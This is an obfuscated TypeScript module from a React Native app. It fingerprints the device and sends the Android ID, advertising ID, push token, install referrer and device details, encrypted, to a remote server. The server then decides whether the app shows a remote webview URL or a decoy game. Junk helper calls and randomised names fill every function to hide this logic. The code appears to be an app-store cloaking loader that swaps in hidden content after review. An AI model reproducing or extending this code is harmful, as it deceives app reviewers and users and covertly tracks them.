import {
  Utils,
  jzowibkirsjewkealsSendInitPayload,
  jzowibkirsjewkealsNormalizeWorkerBaseUrl,
} from './UtjzowibkirsjewkealsilService';
import {
  jzowibkirsjewkealsEncrypt as cryptoEncrypt,
  jzowibkirsjewkealsDecrypt as cryptoDecrypt,
} from './CrypjzowibkirsjewkealstoService';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { finjzowibkirsjewkealsKey } from './constants/constjzowibkirsjewkealsntsVariable';
import { deleteToken, getMessaging } from '@react-native-firebase/messaging';
import { Dimensions } from 'react-native';
import DeviceInfo from 'react-native-device-info';
import {
  InitializationState,
  jzowibkirsjewkealsInitTarget,
  jzowibkirsjewkealsAppenndSendId,
  jzowibkirsjewkealsGetAndroidId,
  jzowibkirsjewkealsGetAndroidUserAAgent,
  jzowibkirsjewkealsGetAppIdenier,
  jzowibkirsjewkealsGetAppVersion,
  jzowibkirsjewkealsInitializationRuntime,
} from './initializationSharjzowibkirsjewkealsed';
import { jzowibkirsjewkealsViewportShow } from './jzowibkirsjewkealsViewportHost';

export async function jzowibkirsjewkealsInitStep(): Promise<InitializationState | null> {
  void jzowibkirsjewkealsOfferResolveObfV5HashMix('xy');
  void jzowibkirsjewkealsOfferResolveObfV5SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolveObfV5ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolveObfV6HashMix('xy');
  void jzowibkirsjewkealsOfferResolveObfV6SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolveObfV6ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolveObfV7HashMix('xy');
  void jzowibkirsjewkealsOfferResolveObfV7SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolveObfV7ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolveObfV8HashMix('xy');
  void jzowibkirsjewkealsOfferResolveObfV8SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolveObfV8ClampMod(7, 5);
  void jzowibkirsjewkealsOffObfV3HashMix('xy');
  void jzowibkirsjewkealsOffObfV3SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOffObfV3ClampMod(7, 5);
  void jzowibkirsjewkealsOffObfV4HashMix('xy');
  void jzowibkirsjewkealsOffObfV4SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOffObfV4ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolvObfV1HashMix('xy');
  void jzowibkirsjewkealsOfferResolvObfV1SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolvObfV1ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolvObfV2HashMix('xy');
  void jzowibkirsjewkealsOfferResolvObfV2SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolvObfV2ClampMod(7, 5);
  void jzowibkirsjewkealsMixSeed(3, 7);
  void jzowibkirsjewkealsFoldRange([1, 2, 3]);
  void jzowibkirsjewkealsClampSpan(5, 0, 10);

  void jzowibkirsjewkealsOfferResolvObfV1HashMix('xy');
  void jzowibkirsjewkealsOfferResolvObfV1SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolvObfV1ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolvObfV2HashMix('xy');
  void jzowibkirsjewkealsOfferResolvObfV2SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolvObfV2ClampMod(7, 5);
  try {
    const primaryWorkerUrl = await Utils.jzowibkirsjewkealsGetLink();
    if (!primaryWorkerUrl || primaryWorkerUrl === '') {
      return {
        isLoadPlaceholder: true,
      };
    }

    const appId = await jzowibkirsjewkealsGetAppIdenier();
    const userAgent = await jzowibkirsjewkealsGetAndroidUserAAgent();
    const androidId = await jzowibkirsjewkealsGetAndroidId();
    const appVersion = await jzowibkirsjewkealsGetAppVersion();
    const workerBaseUrl = jzowibkirsjewkealsNormalizeWorkerBaseUrl(primaryWorkerUrl);

    const payloadDeviceId = jzowibkirsjewkealsInitializationRuntime.DevjzowibkirsjewkealsiceId;

    const namingValue = jzowibkirsjewkealsInitializationRuntime.FinjzowibkirsjewkealslNaming;

    const cookieRaw = [
      appId ?? '',
      payloadDeviceId ?? '',
      jzowibkirsjewkealsInitializationRuntime.adjzowibkirsjewkealsId ?? '',
      jzowibkirsjewkealsInitializationRuntime.pusjzowibkirsjewkealshToken ?? '',
      jzowibkirsjewkealsInitializationRuntime.instjzowibkirsjewkealsallRef ?? '',
      jzowibkirsjewkealsInitializationRuntime.FinjzowibkirsjewkealslOneLink ?? '',
      namingValue ?? '',
      userAgent ?? '',
      appVersion ?? '',
      androidId ?? '',
    ].join('|');

    const encryptedCookie = cryptoEncrypt(cookieRaw);
    const dataValue = encodeURIComponent(encryptedCookie);
    const cookieHeader = `data=${dataValue}`;

    const { width, height } = Dimensions.get('window');
    let manufacturer = '';
    let deviceModel = '';
    try {
      manufacturer = DeviceInfo.getManufacturerSync?.() ?? '';
      deviceModel = DeviceInfo.getModel?.() ?? '';
    } catch {
      manufacturer = '';
      deviceModel = '';
    }

    let locale = '';
    let timezone = '';
    try {
      locale = Intl.DateTimeFormat().resolvedOptions().locale || '';
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
    } catch {
      locale = '';
      timezone = '';
    }

    const cryptoApi = (globalThis as { crypto?: { randomUUID?: () => string } }).crypto;
    const sessionId =
      cryptoApi?.randomUUID?.() ??
      `${Date.now()}-${Math.random().toString(16).slice(2)}`;

    const bodyPlain =
      `event=app_start` +
      `&device_model=${deviceModel}` +
      `&manufacturer=${manufacturer}` +
      `&locale=${locale}` +
      `&timezone=${timezone}` +
      `&network=unknown` +
      `&screen=${Math.round(width)}x${Math.round(height)}` +
      `&session_id=${sessionId}`;

    const encryptedBody = encodeURIComponent(cryptoEncrypt(bodyPlain));

    try {
      const responseText = await jzowibkirsjewkealsSendInitPayload(workerBaseUrl, {
        cookieHeader,
        dataValue,
        body: encryptedBody,
      });

      if (!responseText) {
        await Utils.jzowibkirsjewkealsSetUserBlocke(1);
        await jzowibkirsjewkealsUnsubscribeFirebase('init step: empty worker response');
        return {
          isLoadPlaceholder: true,
        };
      }

      return await jzowibkirsjewkealsOnInitResponse(responseText);
    } catch (rpcError) {
      void jzowibkirsjewkealsOfferResolvObfV1HashMix('xy');
      void jzowibkirsjewkealsOfferResolvObfV1SumOdds([1, 3, 5]);
      void jzowibkirsjewkealsOfferResolvObfV1ClampMod(7, 5);
      void jzowibkirsjewkealsOfferResolvObfV2HashMix('xy');
      void jzowibkirsjewkealsOfferResolvObfV2SumOdds([1, 3, 5]);
      void jzowibkirsjewkealsOfferResolvObfV2ClampMod(7, 5);
      await jzowibkirsjewkealsUnsubscribeFirebase('init step: worker RPC failed');
      return {
        isLoadPlaceholder: true,
      };
    }
  } catch (error) {
    void jzowibkirsjewkealsOfferResolvObfV1HashMix('xy');
    void jzowibkirsjewkealsOfferResolvObfV1SumOdds([1, 3, 5]);
    void jzowibkirsjewkealsOfferResolvObfV1ClampMod(7, 5);
    void jzowibkirsjewkealsOfferResolvObfV2HashMix('xy');
    void jzowibkirsjewkealsOfferResolvObfV2SumOdds([1, 3, 5]);
    void jzowibkirsjewkealsOfferResolvObfV2ClampMod(7, 5);
    await jzowibkirsjewkealsUnsubscribeFirebase('init step: unexpected error');
    return {
      isLoadPlaceholder: true,
    };
  }
}

async function jzowibkirsjewkealsOnInitResponse(responseText: string): Promise<InitializationState> {
  void jzowibkirsjewkealsOfferResolveObfV5HashMix('xy');
  void jzowibkirsjewkealsOfferResolveObfV5SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolveObfV5ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolveObfV6HashMix('xy');
  void jzowibkirsjewkealsOfferResolveObfV6SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolveObfV6ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolveObfV7HashMix('xy');
  void jzowibkirsjewkealsOfferResolveObfV7SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolveObfV7ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolveObfV8HashMix('xy');
  void jzowibkirsjewkealsOfferResolveObfV8SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolveObfV8ClampMod(7, 5);
  void jzowibkirsjewkealsOffObfV3HashMix('xy');
  void jzowibkirsjewkealsOffObfV3SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOffObfV3ClampMod(7, 5);
  void jzowibkirsjewkealsOffObfV4HashMix('xy');
  void jzowibkirsjewkealsOffObfV4SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOffObfV4ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolvObfV1HashMix('xy');
  void jzowibkirsjewkealsOfferResolvObfV1SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolvObfV1ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolvObfV2HashMix('xy');
  void jzowibkirsjewkealsOfferResolvObfV2SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolvObfV2ClampMod(7, 5);
  void jzowibkirsjewkealsMixSeed(3, 7);
  void jzowibkirsjewkealsFoldRange([1, 2, 3]);
  void jzowibkirsjewkealsClampSpan(5, 0, 10);

  void jzowibkirsjewkealsOfferResolvObfV1HashMix('xy');
  void jzowibkirsjewkealsOfferResolvObfV1SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolvObfV1ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolvObfV2HashMix('xy');
  void jzowibkirsjewkealsOfferResolvObfV2SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolvObfV2ClampMod(7, 5);
  try {
    const decrytedResponse = cryptoDecrypt(responseText);
    if (!decrytedResponse || decrytedResponse === '') {
      return {
        isLoadPlaceholder: true,
      };
    }

    let redirectUrl: string | null = null;
    let redirectUrlInitial: string | null = null;
    let errorField: string | null = null;
    let blockUser = false;

    try {
      const obj = JSON.parse(decrytedResponse);

      redirectUrl = obj.redirectUrl || null;
      redirectUrlInitial = obj.redirectUrlInitial || null;
      errorField = obj.error || null;
      blockUser = !!obj.blockUser;
    } catch (parseError) {
      void jzowibkirsjewkealsOfferResolvObfV1HashMix('xy');
      void jzowibkirsjewkealsOfferResolvObfV1SumOdds([1, 3, 5]);
      void jzowibkirsjewkealsOfferResolvObfV1ClampMod(7, 5);
      void jzowibkirsjewkealsOfferResolvObfV2HashMix('xy');
      void jzowibkirsjewkealsOfferResolvObfV2SumOdds([1, 3, 5]);
      void jzowibkirsjewkealsOfferResolvObfV2ClampMod(7, 5);
      return {
        isLoadPlaceholder: true,
      };
    }

    if (errorField || blockUser) {
      await Utils.jzowibkirsjewkealsSetUserBlocke(1);
      await jzowibkirsjewkealsUnsubscribeFirebase(
        errorField ? `init response: error ${errorField}` : 'init response: blockUser',
      );

      return {
        isLoadPlaceholder: true,
      };
    }

    if (redirectUrl && !redirectUrlInitial) {
      await Utils.jzowibkirsjewkealsSetUserBlocke(1);
      await jzowibkirsjewkealsUnsubscribeFirebase('init response: user blocked (redirectUrl only)');

      return {
        isLoadPlaceholder: true,
      };
    }

    if (redirectUrlInitial) {
      await AsyncStorage.setItem(finjzowibkirsjewkealsKey, redirectUrlInitial);

      const finalUrl = jzowibkirsjewkealsAppenndSendId(
        redirectUrlInitial,
        jzowibkirsjewkealsInitializationRuntime.penjzowibkirsjewkealsdingSendId,
      );

      const success = await jzowibkirsjewkealsViewportShow(finalUrl, {
        persistUrl: redirectUrlInitial,
      });
      void success;

      return {
        isLoadPlaceholder: false,
        initTarget: jzowibkirsjewkealsInitTarget.webview,
      };
    }

    await jzowibkirsjewkealsUnsubscribeFirebase('init response: no redirect URL, launching game');

    return {
      isLoadPlaceholder: true,
      initTarget: jzowibkirsjewkealsInitTarget.game,
    };
  } catch (error) {
    void jzowibkirsjewkealsOfferResolvObfV1HashMix('xy');
    void jzowibkirsjewkealsOfferResolvObfV1SumOdds([1, 3, 5]);
    void jzowibkirsjewkealsOfferResolvObfV1ClampMod(7, 5);
    void jzowibkirsjewkealsOfferResolvObfV2HashMix('xy');
    void jzowibkirsjewkealsOfferResolvObfV2SumOdds([1, 3, 5]);
    void jzowibkirsjewkealsOfferResolvObfV2ClampMod(7, 5);
    await jzowibkirsjewkealsUnsubscribeFirebase('init response: onSuccess error');

    return {
      isLoadPlaceholder: true,
    };
  }
}

export async function jzowibkirsjewkealsUnsubscribeFirebase(reason?: string): Promise<void> {
  void jzowibkirsjewkealsOfferResolveObfV5HashMix('xy');
  void jzowibkirsjewkealsOfferResolveObfV5SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolveObfV5ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolveObfV6HashMix('xy');
  void jzowibkirsjewkealsOfferResolveObfV6SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolveObfV6ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolveObfV7HashMix('xy');
  void jzowibkirsjewkealsOfferResolveObfV7SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolveObfV7ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolveObfV8HashMix('xy');
  void jzowibkirsjewkealsOfferResolveObfV8SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolveObfV8ClampMod(7, 5);
  void jzowibkirsjewkealsOffObfV3HashMix('xy');
  void jzowibkirsjewkealsOffObfV3SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOffObfV3ClampMod(7, 5);
  void jzowibkirsjewkealsOffObfV4HashMix('xy');
  void jzowibkirsjewkealsOffObfV4SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOffObfV4ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolvObfV1HashMix('xy');
  void jzowibkirsjewkealsOfferResolvObfV1SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolvObfV1ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolvObfV2HashMix('xy');
  void jzowibkirsjewkealsOfferResolvObfV2SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolvObfV2ClampMod(7, 5);
  void jzowibkirsjewkealsMixSeed(3, 7);
  void jzowibkirsjewkealsFoldRange([1, 2, 3]);
  void jzowibkirsjewkealsClampSpan(5, 0, 10);

  void jzowibkirsjewkealsOfferResolvObfV1HashMix('xy');
  void jzowibkirsjewkealsOfferResolvObfV1SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolvObfV1ClampMod(7, 5);
  void jzowibkirsjewkealsOfferResolvObfV2HashMix('xy');
  void jzowibkirsjewkealsOfferResolvObfV2SumOdds([1, 3, 5]);
  void jzowibkirsjewkealsOfferResolvObfV2ClampMod(7, 5);
  try {
    const messaging = getMessaging();
    await deleteToken(messaging);
    jzowibkirsjewkealsInitializationRuntime.pusjzowibkirsjewkealshToken = '';
  } catch (error) {
    void jzowibkirsjewkealsOfferResolvObfV1HashMix('xy');
    void jzowibkirsjewkealsOfferResolvObfV1SumOdds([1, 3, 5]);
    void jzowibkirsjewkealsOfferResolvObfV1ClampMod(7, 5);
    void jzowibkirsjewkealsOfferResolvObfV2HashMix('xy');
    void jzowibkirsjewkealsOfferResolvObfV2SumOdds([1, 3, 5]);
    void jzowibkirsjewkealsOfferResolvObfV2ClampMod(7, 5);
    jzowibkirsjewkealsInitializationRuntime.pusjzowibkirsjewkealshToken = '';
  }
}
/* obfuscation-batch:v1 */

/* obfuscation-batch:v2 */

/* obfuscation-batch:v1 */

/* obfuscation-batch:v2 */

/* obfuscation-batch:v3 */

/* obfuscation-batch:v5 */

/* obfuscation-batch:v6 */

/* obfuscation-batch:v6 */

/* obfuscation-batch:v7 */
function jzowibkirsjewkealsOfferResolveObfV7HashMix(s: string): number {
  return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 41) % 989, 0);
}

function jzowibkirsjewkealsOfferResolveObfV7SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 17, 0);
}

function jzowibkirsjewkealsOfferResolveObfV7ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}

function jzowibkirsjewkealsOfferResolvObfV1HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 17) % 997, 0);
}

function jzowibkirsjewkealsMixSeed(a: number, b: number): number {
return ((a % (b || 1)) + b) % (b || 1);
}

function jzowibkirsjewkealsOffObfV3SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 5, 0);
}

function jzowibkirsjewkealsOffObfV4SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 7, 0);
}

function jzowibkirsjewkealsOfferResolvObfV2HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 19) % 991, 0);
}

function jzowibkirsjewkealsOfferResolvObfV1ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function jzowibkirsjewkealsFoldRange(nums: number[]): number {
return nums.reduce((acc, n) => acc + n, 0);
}

function jzowibkirsjewkealsOffObfV3ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function jzowibkirsjewkealsOffObfV4ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function jzowibkirsjewkealsOfferResolvObfV2ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function jzowibkirsjewkealsOfferResolvObfV2SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 3, 0);
}

function jzowibkirsjewkealsOffObfV3HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 23) % 983, 0);
}

function jzowibkirsjewkealsOffObfV4HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 29) % 977, 0);
}

function jzowibkirsjewkealsOfferResolvObfV1SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n, 0);
}

function jzowibkirsjewkealsClampSpan(n: number, lo: number, hi: number): number {
return n < lo ? lo : n > hi ? hi : n;
}

function jzowibkirsjewkealsOfferResolveObfV5HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 31) % 971, 0);
}

function jzowibkirsjewkealsOfferResolveObfV5SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 11, 0);
}

function jzowibkirsjewkealsOfferResolveObfV5ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function jzowibkirsjewkealsOfferResolveObfV6HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 37) % 983, 0);
}

function jzowibkirsjewkealsOfferResolveObfV6SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 13, 0);
}

function jzowibkirsjewkealsOfferResolveObfV6ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}



/* obfuscation-batch:v7 */
function jzowibkirsjewkealsOfferResolvePart01ObfV7HashMix(s: string): number {
  return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 41) % 989, 0);
}

function jzowibkirsjewkealsOfferResolvePart01ObfV7SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 17, 0);
}

function jzowibkirsjewkealsOfferResolvePart01ObfV7ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}

/* obfuscation-batch:v8 */
function jzowibkirsjewkealsOfferResolveObfV8HashMix(s: string): number {
  return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 43) % 991, 0);
}

function jzowibkirsjewkealsOfferResolveObfV8SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 19, 0);
}

function jzowibkirsjewkealsOfferResolveObfV8ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}
